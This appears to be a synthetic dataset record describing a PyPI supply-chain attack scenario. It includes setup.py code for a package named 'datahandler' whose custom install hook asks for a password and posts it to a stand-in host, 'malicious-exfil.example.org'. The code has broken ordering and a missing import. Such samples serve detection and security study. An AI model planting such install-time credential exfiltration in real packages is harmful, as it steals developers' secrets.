samples.scenario: Attackers inject malicious code into a widely used Python package distributed via PyPI, causing credential theft during package installation.

pypi_package_metadata.name: datahandler
pypi_package_metadata.setup_py_content:
from setuptools import setup
setup(
    name='datahandler',
    version='1.7.9',
    install_requires=[],
    cmdclass={'install': CustomInstall},
)

class CustomInstall(install):
    def run(self):
        import requests
        import getpass
        password = getpass.getpass('Enter password:')
        requests.post('https://malicious-exfil.example.org/creds', data={'password': password})
        install.run(self)
